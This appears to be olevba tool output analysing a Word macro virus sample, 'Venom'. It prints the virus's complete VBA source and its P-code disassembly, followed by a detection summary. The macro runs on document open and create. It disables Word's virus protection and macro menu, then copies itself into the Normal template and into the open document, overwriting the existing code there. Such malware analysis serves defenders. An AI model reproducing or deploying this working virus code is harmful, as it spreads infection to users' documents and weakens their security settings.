olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Venom
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Venom7.cls 
in file: ./Virus.MSWord.Venom - OLE stream: 'Macros/VBA/Venom7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_New()
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2

If ADI1.Name <> "Venom7" Then
    If ADCL > 0 Then
        Dim f As Long
        For f = 1 To ADCL
            On Error Resume Next
            ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines f, 1
        Next f
        ADI1.Name = "Venom7"
        DoAD = True
    Else
        ADI1.Name = "Venom7"
        DoAD = True
    End If
End If

If NTI1.Name <> "Venom7" Then
    If NTCL > 0 Then
        Dim i As Long
        For i = 1 To NTCL
            On Error Resume Next
            NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i, 1
        Next i
        NTI1.Name = "Venom7"
        DoNT = True
    Else
        NTI1.Name = "Venom7"
        DoNT = True
    End If
End If
If DoNT <> True And DoAD <> True Then GoTo CYA

If DoAD = True Then
    For hunger = NTCL To 1 Step -1
        ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(hunger, 1)
    Next hunger
    docname = Left$(ActiveDocument.Name, 8)
    If docname <> "Document" Then
    ActiveDocument.Save
    End If
End If

If DoNT = True Then
    For hunger = ADCL To 1 Step -1
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(hunger, 1)
    Next hunger
End If



CYA:
If Day(Now) = Minute(Now) Then Selection.TypeText " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over.  I'm outta here."

End Sub

Private Sub Document_Open()

CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2

If ADI1.Name <> "Venom7" Then
    If ADCL > 0 Then
        Dim f As Long
        For f = 1 To ADCL
            On Error Resume Next
            ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines f, 1
        Next f
        ADI1.Name = "Venom7"
        DoAD = True
    Else
        ADI1.Name = "Venom7"
        DoAD = True
    End If
End If

If NTI1.Name <> "Venom7" Then
    If NTCL > 0 Then
        Dim i As Long
        For i = 1 To NTCL
            On Error Resume Next
            NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i, 1
        Next i
        NTI1.Name = "Venom7"
        DoNT = True
    Else
        NTI1.Name = "Venom7"
        DoNT = True
    End If
End If
If DoNT <> True And DoAD <> True Then GoTo CYA

If DoAD = True Then
    For hunger = NTCL To 1 Step -1
        ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(hunger, 1)
    Next hunger
    ActiveDocument.Save
End If

If DoNT = True Then
    For hunger = ADCL To 1 Step -1
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(hunger, 1)
    Next hunger
End If



CYA:
If Day(Now) = Minute(Now) Then Selection.TypeText " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over.  I'm outta here."
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Venom
' ===============================================================================
' Module streams:
' Macros/VBA/Venom7 - 6244 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub Document_New())
' Line #3:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #4:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ADI1 
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NTI1 
' Line #7:
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTCL 
' Line #8:
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADCL 
' Line #9:
' 	LitDI2 0x0002 
' 	St BGN 
' Line #10:
' Line #11:
' 	Ld ADI1 
' 	MemLd New 
' 	LitStr 0x0006 "Venom7"
' 	Ne 
' 	IfBlock 
' Line #12:
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #13:
' 	Dim 
' 	VarDefn False (As Long)
' Line #14:
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ADCL 
' 	For 
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	Ld False 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #17:
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	NextVar 
' Line #18:
' 	LitStr 0x0006 "Venom7"
' 	Ld ADI1 
' 	MemSt New 
' Line #19:
' 	LitVarSpecial (True)
' 	St DoAD 
' Line #20:
' 	ElseBlock 
' Line #21:
' 	LitStr 0x0006 "Venom7"
' 	Ld ADI1 
' 	MemSt New 
' Line #22:
' 	LitVarSpecial (True)
' 	St DoAD 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	EndIfBlock 
' Line #25:
' Line #26:
' 	Ld NTI1 
' 	MemLd New 
' 	LitStr 0x0006 "Venom7"
' 	Ne 
' 	IfBlock 
' Line #27:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #28:
' 	Dim 
' 	VarDefn i (As Long)
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NTCL 
' 	For 
' Line #30:
' 	OnError (Resume Next) 
' Line #31:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #32:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	LitStr 0x0006 "Venom7"
' 	Ld NTI1 
' 	MemSt New 
' Line #34:
' 	LitVarSpecial (True)
' 	St DoNT 
' Line #35:
' 	ElseBlock 
' Line #36:
' 	LitStr 0x0006 "Venom7"
' 	Ld NTI1 
' 	MemSt New 
' Line #37:
' 	LitVarSpecial (True)
' 	St DoNT 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo CYA 
' 	EndIf 
' Line #41:
' Line #42:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld hunger 
' 	EndForVariable 
' 	Ld NTCL 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld hunger 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #45:
' 	StartForVariable 
' 	Ld hunger 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound$ 0x0002 
' 	St docname 
' Line #47:
' 	Ld docname 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #48:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndIfBlock 
' Line #51:
' Line #52:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #53:
' 	StartForVariable 
' 	Ld hunger 
' 	EndForVariable 
' 	Ld ADCL 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #54:
' 	LitDI2 0x0001 
' 	Ld hunger 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #55:
' 	StartForVariable 
' 	Ld hunger 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' 	Label CYA 
' Line #61:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0076 " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over.  I'm outta here."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	EndIf 
' Line #62:
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Private Sub Document_Open())
' Line #66:
' Line #67:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #68:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #69:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ADI1 
' Line #70:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NTI1 
' Line #71:
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTCL 
' Line #72:
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADCL 
' Line #73:
' 	LitDI2 0x0002 
' 	St BGN 
' Line #74:
' Line #75:
' 	Ld ADI1 
' 	MemLd New 
' 	LitStr 0x0006 "Venom7"
' 	Ne 
' 	IfBlock 
' Line #76:
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #77:
' 	Dim 
' 	VarDefn False (As Long)
' Line #78:
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ADCL 
' 	For 
' Line #79:
' 	OnError (Resume Next) 
' Line #80:
' 	Ld False 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #81:
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	NextVar 
' Line #82:
' 	LitStr 0x0006 "Venom7"
' 	Ld ADI1 
' 	MemSt New 
' Line #83:
' 	LitVarSpecial (True)
' 	St DoAD 
' Line #84:
' 	ElseBlock 
' Line #85:
' 	LitStr 0x0006 "Venom7"
' 	Ld ADI1 
' 	MemSt New 
' Line #86:
' 	LitVarSpecial (True)
' 	St DoAD 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	EndIfBlock 
' Line #89:
' Line #90:
' 	Ld NTI1 
' 	MemLd New 
' 	LitStr 0x0006 "Venom7"
' 	Ne 
' 	IfBlock 
' Line #91:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #92:
' 	Dim 
' 	VarDefn i (As Long)
' Line #93:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NTCL 
' 	For 
' Line #94:
' 	OnError (Resume Next) 
' Line #95:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #96:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #97:
' 	LitStr 0x0006 "Venom7"
' 	Ld NTI1 
' 	MemSt New 
' Line #98:
' 	LitVarSpecial (True)
' 	St DoNT 
' Line #99:
' 	ElseBlock 
' Line #100:
' 	LitStr 0x0006 "Venom7"
' 	Ld NTI1 
' 	MemSt New 
' Line #101:
' 	LitVarSpecial (True)
' 	St DoNT 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo CYA 
' 	EndIf 
' Line #105:
' Line #106:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #107:
' 	StartForVariable 
' 	Ld hunger 
' 	EndForVariable 
' 	Ld NTCL 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #108:
' 	LitDI2 0x0001 
' 	Ld hunger 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #109:
' 	StartForVariable 
' 	Ld hunger 
' 	EndForVariable 
' 	NextVar 
' Line #110:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #111:
' 	EndIfBlock 
' Line #112:
' Line #113:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #114:
' 	StartForVariable 
' 	Ld hunger 
' 	EndForVariable 
' 	Ld ADCL 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #115:
' 	LitDI2 0x0001 
' 	Ld hunger 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #116:
' 	StartForVariable 
' 	Ld hunger 
' 	EndForVariable 
' 	NextVar 
' Line #117:
' 	EndIfBlock 
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' 	Label CYA 
' Line #122:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0076 " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over.  I'm outta here."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	EndIf 
' Line #123:
' 	EndSub 
' Line #124:
' Line #125:
' Line #126:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

